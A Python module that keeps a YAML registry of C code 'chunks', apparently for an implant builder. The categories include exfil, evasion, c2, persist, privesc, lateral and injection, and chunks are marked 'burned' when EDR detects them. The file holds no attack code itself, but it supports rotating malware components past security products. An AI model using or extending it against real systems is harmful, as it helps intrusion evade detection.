#!/usr/bin/env python3
"""
Chunk Registry - Manage chunk status, tags, and metadata.

Usage:
    from templates.chunks.registry import load_registry, is_enabled, get_burned
"""

import os
from datetime import datetime, timedelta
from pathlib import Path

import yaml

CHUNKS_DIR = Path(__file__).parent
REGISTRY_PATH = CHUNKS_DIR / "chunk_registry.yaml"

TRACKED_CATEGORIES = [
    "collectors", "ad_collectors", "exfil", "evasion", "core",
    "arch", "api_resolve", "c2", "commands", "persist", "process", "ad",
    "privesc", "lateral", "injection"
]


def discover_chunks() -> list[str]:
    """Discover all .c chunk files on disk."""
    chunks = []
    for category in TRACKED_CATEGORIES:
        cat_dir = CHUNKS_DIR / category
        if cat_dir.is_dir():
            for f in cat_dir.glob("*.c"):
                chunks.append(f"{category}/{f.stem}")
    return sorted(chunks)


def sync_registry(registry: dict | None = None) -> tuple[dict, list[str]]:
    """
    Sync registry with chunks on disk. Auto-adds new chunks.
    Returns (updated_registry, list of newly added chunk refs).
    """
    if registry is None:
        registry = load_registry()

    on_disk = set(discover_chunks())
    in_registry = set(registry.get("chunks", {}).keys())

    new_chunks = on_disk - in_registry
    today = datetime.now().strftime("%Y-%m-%d")

    for chunk_ref in new_chunks:
        registry.setdefault("chunks", {})[chunk_ref] = {
            "status": "enabled",
            "tags": ["new"],
            "created_at": today,
        }

    if new_chunks:
        save_registry(registry)

    return registry, sorted(new_chunks)


def load_registry(auto_sync: bool = True) -> dict:
    """Load the chunk registry. Auto-syncs with disk by default."""
    if not REGISTRY_PATH.exists():
        registry = {"version": 1, "chunks": {}}
    else:
        with open(REGISTRY_PATH) as f:
            registry = yaml.safe_load(f) or {"version": 1, "chunks": {}}

    if auto_sync:
        registry, _ = sync_registry(registry)

    return registry


def save_registry(registry: dict) -> None:
    """Save the chunk registry."""
    registry["last_updated"] = datetime.now().strftime("%Y-%m-%d")
    with open(REGISTRY_PATH, "w") as f:
        yaml.dump(registry, f, default_flow_style=False, sort_keys=False, allow_unicode=True)


def get_chunk_meta(chunk_ref: str, registry: dict | None = None) -> dict:
    """Get metadata for a chunk. Returns empty dict if not registered."""
    if registry is None:
        registry = load_registry()
    return registry.get("chunks", {}).get(chunk_ref, {})


def is_enabled(chunk_ref: str, registry: dict | None = None) -> bool:
    """Check if a chunk is enabled (default True if not registered)."""
    meta = get_chunk_meta(chunk_ref, registry)
    return meta.get("status", "enabled") == "enabled"


def is_burned(chunk_ref: str, registry: dict | None = None) -> bool:
    """Check if a chunk is burned (disabled due to EDR detection)."""
    meta = get_chunk_meta(chunk_ref, registry)
    return "burned" in meta.get("tags", [])


def is_new(chunk_ref: str, days: int = 7, registry: dict | None = None) -> bool:
    """Check if a chunk was created within the last N days."""
    meta = get_chunk_meta(chunk_ref, registry)
    if "new" in meta.get("tags", []):
        return True
    created = meta.get("created_at")
    if created:
        try:
            created_date = datetime.strptime(created, "%Y-%m-%d")
            return datetime.now() - created_date < timedelta(days=days)
        except ValueError:
            pass
    return False


def get_burn_reason(chunk_ref: str, registry: dict | None = None) -> str | None:
    """Get the reason why a chunk was disabled/burned."""
    meta = get_chunk_meta(chunk_ref, registry)
    return meta.get("burn_reason")


def get_disabled_chunks(registry: dict | None = None) -> list[tuple[str, str]]:
    """Get list of (chunk_ref, reason) for all disabled chunks."""
    if registry is None:
        registry = load_registry()
    result = []
    for chunk_ref, meta in registry.get("chunks", {}).items():
        if meta.get("status") == "disabled":
            reason = meta.get("burn_reason", "disabled")
            result.append((chunk_ref, reason))
    return result


def get_enabled_chunks(registry: dict | None = None) -> list[str]:
    """Get list of all enabled chunk refs."""
    if registry is None:
        registry = load_registry()
    return [ref for ref, meta in registry.get("chunks", {}).items()
            if meta.get("status", "enabled") == "enabled"]


def get_new_chunks(days: int = 7, registry: dict | None = None) -> list[str]:
    """Get list of chunks created within the last N days."""
    if registry is None:
        registry = load_registry()
    result = []
    cutoff = datetime.now() - timedelta(days=days)
    for chunk_ref, meta in registry.get("chunks", {}).items():
        if "new" in meta.get("tags", []):
            result.append(chunk_ref)
        elif created := meta.get("created_at"):
            try:
                if datetime.strptime(created, "%Y-%m-%d") > cutoff:
                    result.append(chunk_ref)
            except ValueError:
                pass
    return result


def set_chunk_status(chunk_ref: str, status: str, reason: str | None = None,
                     tags: list[str] | None = None, registry: dict | None = None) -> None:
    """
    Set chunk status and optionally add tags/reason.

    status: "enabled" or "disabled"
    reason: burn_reason if disabling
    tags: additional tags to add (e.g., ["burned", "behavioral"])
    """
    if registry is None:
        registry = load_registry()

    if chunk_ref not in registry.get("chunks", {}):
        registry.setdefault("chunks", {})[chunk_ref] = {
            "created_at": datetime.now().strftime("%Y-%m-%d")
        }

    meta = registry["chunks"][chunk_ref]
    meta["status"] = status

    if status == "disabled":
        meta["disabled_at"] = datetime.now().strftime("%Y-%m-%d")
        if reason:
            meta["burn_reason"] = reason
    elif status == "enabled":
        meta.pop("disabled_at", None)
        meta.pop("burn_reason", None)
        meta["last_validated"] = datetime.now().strftime("%Y-%m-%d")

    if tags:
        existing = set(meta.get("tags", []))
        existing.update(tags)
        meta["tags"] = list(existing)

    save_registry(registry)


def add_chunk(chunk_ref: str, status: str = "enabled", tags: list[str] | None = None,
              note: str | None = None) -> None:
    """Add a new chunk to the registry."""
    registry = load_registry()

    meta = {
        "status": status,
        "tags": tags or ["new"],
        "created_at": datetime.now().strftime("%Y-%m-%d"),
    }
    if note:
        meta["note"] = note

    registry.setdefault("chunks", {})[chunk_ref] = meta
    save_registry(registry)


def remove_tag(chunk_ref: str, tag: str, registry: dict | None = None) -> None:
    """Remove a tag from a chunk."""
    if registry is None:
        registry = load_registry()

    if chunk_ref in registry.get("chunks", {}):
        tags = registry["chunks"][chunk_ref].get("tags", [])
        if tag in tags:
            tags.remove(tag)
            registry["chunks"][chunk_ref]["tags"] = tags
            save_registry(registry)


def filter_chunks(chunks: list[str], skip_disabled: bool = True,
                  registry: dict | None = None) -> tuple[list[str], list[tuple[str, str]]]:
    """
    Filter a list of chunks, removing disabled ones.

    Returns: (filtered_chunks, [(skipped_chunk, reason), ...])
    """
    if registry is None:
        registry = load_registry()

    result = []
    skipped = []

    for chunk in chunks:
        meta = registry.get("chunks", {}).get(chunk, {})
        status = meta.get("status", "enabled")

        if status == "enabled" or not skip_disabled:
            result.append(chunk)
        else:
            reason = meta.get("burn_reason", "disabled")
            skipped.append((chunk, reason))

    return result, skipped


def list_by_category(category: str, registry: dict | None = None) -> dict[str, dict]:
    """
    List all chunks in a category with their metadata.

    category: "collectors", "evasion", "exfil", "core", "ad_collectors"
    """
    if registry is None:
        registry = load_registry()

    prefix = f"{category}/"
    return {ref: meta for ref, meta in registry.get("chunks", {}).items()
            if ref.startswith(prefix)}


def summary(registry: dict | None = None) -> dict:
    """Get summary statistics about the registry."""
    if registry is None:
        registry = load_registry()

    chunks = registry.get("chunks", {})

    enabled = sum(1 for m in chunks.values() if m.get("status", "enabled") == "enabled")
    disabled = sum(1 for m in chunks.values() if m.get("status") == "disabled")
    burned = sum(1 for m in chunks.values() if "burned" in m.get("tags", []))
    new = len(get_new_chunks(registry=registry))

    categories = {}
    for ref in chunks:
        cat = ref.split("/")[0] if "/" in ref else "other"
        categories[cat] = categories.get(cat, 0) + 1

    return {
        "total": len(chunks),
        "enabled": enabled,
        "disabled": disabled,
        "burned": burned,
        "new": new,
        "categories": categories,
    }


if __name__ == "__main__":
    import json
    import sys

    if len(sys.argv) < 2:
        print("Usage: registry.py <command> [args]")
        print("Commands:")
        print("  summary         - Show registry statistics")
        print("  list [category] - List chunks (optionally by category)")
        print("  disabled        - List disabled/burned chunks")
        print("  new             - List new chunks (created in last 7 days)")
        print("  status <chunk>  - Show status of a specific chunk")
        print("  enable <chunk>  - Enable a chunk")
        print("  disable <chunk> <reason> - Disable a chunk with reason")
        sys.exit(0)

    cmd = sys.argv[1]

    if cmd == "summary":
        print(json.dumps(summary(), indent=2))

    elif cmd == "list":
        category = sys.argv[2] if len(sys.argv) > 2 else None
        registry = load_registry()
        if category:
            chunks = list_by_category(category, registry)
        else:
            chunks = registry.get("chunks", {})
        for ref, meta in sorted(chunks.items()):
            status = meta.get("status", "enabled")
            tags = ",".join(meta.get("tags", [])) or "-"
            print(f"{ref}: {status} [{tags}]")

    elif cmd == "disabled":
        for ref, reason in get_disabled_chunks():
            print(f"{ref}: {reason}")

    elif cmd == "new":
        for ref in get_new_chunks():
            meta = get_chunk_meta(ref)
            print(f"{ref} (created: {meta.get('created_at', 'unknown')})")

    elif cmd == "status":
        if len(sys.argv) < 3:
            print("Usage: registry.py status <chunk>")
            sys.exit(1)
        chunk = sys.argv[2]
        meta = get_chunk_meta(chunk)
        if meta:
            print(json.dumps(meta, indent=2))
        else:
            print(f"Chunk '{chunk}' not in registry")

    elif cmd == "enable":
        if len(sys.argv) < 3:
            print("Usage: registry.py enable <chunk>")
            sys.exit(1)
        chunk = sys.argv[2]
        set_chunk_status(chunk, "enabled")
        print(f"Enabled: {chunk}")

    elif cmd == "disable":
        if len(sys.argv) < 4:
            print("Usage: registry.py disable <chunk> <reason>")
            sys.exit(1)
        chunk = sys.argv[2]
        reason = sys.argv[3]
        set_chunk_status(chunk, "disabled", reason=reason, tags=["burned"])
        print(f"Disabled: {chunk} ({reason})")

    else:
        print(f"Unknown command: {cmd}")
        sys.exit(1)
